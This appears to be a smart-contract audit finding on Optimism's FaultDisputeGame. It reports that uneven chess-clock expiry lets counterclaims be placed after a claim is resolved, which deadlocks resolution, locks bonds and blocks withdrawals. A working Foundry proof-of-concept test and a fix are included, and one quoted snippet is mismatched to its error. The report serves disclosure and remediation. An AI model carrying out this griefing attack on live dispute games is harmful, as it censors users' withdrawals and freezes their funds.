Savory Magenta Peacock

high

# Wrong clock management at the FaultDisputeGame leads to resolveClaim DOS attack

## Summary
There are two clocks at a Fault Dispute Game. Like a chess game, each clock stops allowing movements if they reach a total period bigger or equal to half of the maximum duration of a game.
Due to how the clock logic works, one clock can be expired and not able to place counterclaims while the other is still able to do so.

This property is dangerous considering counterclaims rely on their clock periods to be able to be resolved but don't require **both** clocks to be expired. This opens the possibility of having claims resolved only to be countered again after their resolution by the clock that still had time left.

## Vulnerability Detail
A counterclaim can be made by attacking a claim after this claim has been solved.
Consider the following scenario:
Alice and Bob are counterclaiming each other sequentially but Alice's clock is running out of time. Mallory is a malicious party watching transactions.
After Alice's clock is finished, Mallory can resolve Alice's last claim by calling resolveClaim to it and Bob can continue placing counterclaims. 

Now Bob counterclaims Alice's last claim and does more random counterclaims. The result is a deadlock because the previously resolved counterclaim has new subgames that can't ever be solved as it would error with ClaimAlreadyResolved:
```solidity
require(
            disputeGameProxy.status() == GameStatus.DEFENDER_WINS,
            "OptimismPortal: output proposal has not been validated"
        );
```

The claim countered by this broken counterclaim can't be solved either, as it errors with OutOfOrderResolution due to the following code snippet:
```solidity
if (subgames[challengeIndex].length != 0) revert OutOfOrderResolution();
```

I've attached a comprehensive proof of concept demonstrating the deadlock in practice, kindly paste it at FaultDisputeGame.t.sol file:
```solidity
function test_poc_01() public {
        // Give the test contract some ether
        uint256 bal = 1000 ether;
        vm.deal(address(this), bal);

        address alice = address(0x1);
        address bob = address(0x2);
        vm.deal(alice, 1000 ether);
        vm.deal(bob, 1000 ether);

        // Make claims all the way down the tree.
        uint256 bond = _getRequiredBond(0);
        uint256 totalBonded = bond;
        vm.prank(alice);
        gameProxy.attack{ value: bond }(0, _dummyClaim());
        bond = _getRequiredBond(1);
        // Will make the even clock run out while the odd will remain with some time

        totalBonded += bond;
        vm.prank(bob);
        gameProxy.attack{ value: bond }(1, _dummyClaim());
        vm.warp(block.timestamp + 13 hours);
        bond = _getRequiredBond(2);
        totalBonded += bond;
        vm.prank(alice);
        gameProxy.attack{ value: bond }(2, _dummyClaim());
        bond = _getRequiredBond(3);
        totalBonded += bond;
        vm.prank(bob);
        gameProxy.attack{ value: bond }(3, _dummyClaim());
        vm.warp(block.timestamp + 13 hours);
        bond = _getRequiredBond(4);
        totalBonded += bond;
        vm.prank(alice);
        gameProxy.attack{ value: bond }(4, _changeClaimStatus(_dummyClaim(), VMStatuses.PANIC));
        bond = _getRequiredBond(5);
        totalBonded += bond;
        vm.prank(bob);
        gameProxy.attack{ value: bond }(5, _dummyClaim());
        vm.warp(block.timestamp + 13 hours);
        bond = _getRequiredBond(6);
        totalBonded += bond;
        vm.prank(alice);
        gameProxy.attack{ value: bond }(6, _dummyClaim());

        // Resolve the dangling claim
        vm.warp(block.timestamp + 2 days);
        (bool success,) = address(gameProxy).call(abi.encodeCall(gameProxy.resolveClaim, (gameProxy.claimDataLen() - 1)));
        assertTrue(success);

        // Bob is still able to place bonds on some claims
        bond = _getRequiredBond(7);
        totalBonded += bond;
        vm.prank(bob);
        gameProxy.attack{ value: bond }(7, _dummyClaim());

        // With the grandparent clock, make a different counter claim to the claim we have just resolved
        bond = _getRequiredBond(5);
        totalBonded += bond;
        vm.prank(bob);
        gameProxy.attack{ value: bond }(5, Claim.wrap(keccak256(abi.encode(gasleft() + 1))));

        // Bob is still able to place bonds on some claims
        bond = _getRequiredBond(7);
        totalBonded += bond;
        vm.prank(bob);
        gameProxy.attack{ value: bond }(7, _dummyClaim());

        bond = _getRequiredBond(6);
        totalBonded += bond;
        vm.prank(bob);
        vm.expectRevert(ClockTimeExceeded.selector);
        gameProxy.attack{ value: bond }(6, Claim.wrap(keccak256(abi.encode(gasleft() + 1))));

        // Ppass some time so all claims can be resolved now, otherwise we error with ClockNotExpired.
        // We can't solve the claims as they now error OutOfOrderResolution() because bond 6 received a new subgame after it had been resolved
        vm.warp(block.timestamp + 5 days);
        // The last 3 claims can be resolved. Claim at index 7 was previously resolved.
        for (uint256 i = gameProxy.claimDataLen(); i > 8; i--) {
            (bool success,) = address(gameProxy).call(abi.encodeCall(gameProxy.resolveClaim, (i - 1)));
        }

        // Now the first claims are pretty much locked.
        // Repeat the loop a couple of times to ensure the contract is in indefinite deadlock
        for (uint256 i = gameProxy.claimDataLen(); i > 0; i--) {
            if(i< 7){
                vm.expectRevert(OutOfOrderResolution.selector);
                (bool success,) = address(gameProxy).call(abi.encodeCall(gameProxy.resolveClaim, (i - 1)));
            } else {
                vm.expectRevert(ClaimAlreadyResolved.selector);
                (bool success,) = address(gameProxy).call(abi.encodeCall(gameProxy.resolveClaim, (i - 1)));
            }
        }

        for (uint256 i = gameProxy.claimDataLen(); i > 0; i--) {
            if(i< 7){
                vm.expectRevert(OutOfOrderResolution.selector);
                (bool success,) = address(gameProxy).call(abi.encodeCall(gameProxy.resolveClaim, (i - 1)));
            } else {
                vm.expectRevert(ClaimAlreadyResolved.selector);
                (bool success,) = address(gameProxy).call(abi.encodeCall(gameProxy.resolveClaim, (i - 1)));
            }
        }

        for (uint256 i = gameProxy.claimDataLen(); i > 0; i--) {
            if(i< 7){
                vm.expectRevert(OutOfOrderResolution.selector);
                (bool success,) = address(gameProxy).call(abi.encodeCall(gameProxy.resolveClaim, (i - 1)));
            } else {
                vm.expectRevert(ClaimAlreadyResolved.selector);
                (bool success,) = address(gameProxy).call(abi.encodeCall(gameProxy.resolveClaim, (i - 1)));
            }
        }
    }
```

Run the test with the following command:
```shell
forge test --match-test test_poc_01 -vvvvv
```

Do take some time to look at the execution traces, as they are of utmost importance to demonstrate the deadlock state in the contract.

## Impact
### 1
Making a counterclaim after the target claim has been resolved will lock the counterclaim bond without recovery outside of the Guardian's actions.
The following invariants are violated: 
Top-level:
"Participants must be able to withdraw a credit denominated in ETH exactly equal to but not greater than the credit amount that would be distributed to that user by a fully correct resolution of the FaultDisputeGame."; 
Contract:
"Cannot resolve a subgame containing an unresolved claim."; 

From a certain counterclaim level, no participant can withdraw its bond regardless of its claim correctness, leaving it locked forever at the FaultDisputeGame contract.

### 2
The withdrawal that is dependent on the victimized FaultDisputeGame at the OptimismPortal2 contract, will not be able to be finalized, as the finalizeWithdrawalTransaction call will checkWithdrawal and revert with the following error as the game will never leave the IN_PROGRESS status:
```solidity
require(
            disputeGameProxy.status() == GameStatus.DEFENDER_WINS,
            "OptimismPortal: output proposal has not been validated"
        );
```

### Severity Breakdown
The severity is considered high due to the following reasons:
Likelihood: high - easy to set up, costs one arbitrary bond.
Impact: medium - has two main impacts: unsolvable fault dispute games + bonds locked.
Unsolvable fault dispute games can be annoying and incur significant costs to the withdrawer as it would require him/her to deploy new FaultDisputeGames and wait for the clock to reach expiry again.
Considering a malicious party can deadlock withdrawals by attacking counterclaims at low-depth (cheap bonds), this can be utilized as a means to censor one's ability to move funds.

Even though it locks bonds, this impact can be mitigated by guardian actions at the DelayedWeth contract. This comes with significant concerns over the purpose of the system as it has been designed to decentralize fault proofs on the chain.
Due to the high likelihood of the attack, there is the possibility for broad-scale attacks and this may present significant gas costs for the owner to send back funds to the rightful owners.

## Code Snippet

https://github.com/ethereum-optimism/optimism/blob/develop/packages/contracts-bedrock/src/dispute/FaultDisputeGame.sol#L422C8-L424C10
https://github.com/ethereum-optimism/optimism/blob/develop/packages/contracts-bedrock/src/dispute/FaultDisputeGame.sol#L391
https://github.com/ethereum-optimism/optimism/blob/develop/packages/contracts-bedrock/src/L1/OptimismPortal2.sol#L492C9-L495C11

## Tool used

Manual Review

## Recommendation
Make sure no counter claims can be done after the resolution phase is begun, as it can brick the whole fault dispute game. An interesting option would be to create a RESOLUTION status in between the IN_PROGRESS and CHALLENGER_WINS/DEFENDER_WINS statuses. This way counter claims cannot be made after a claim has already been resolved.
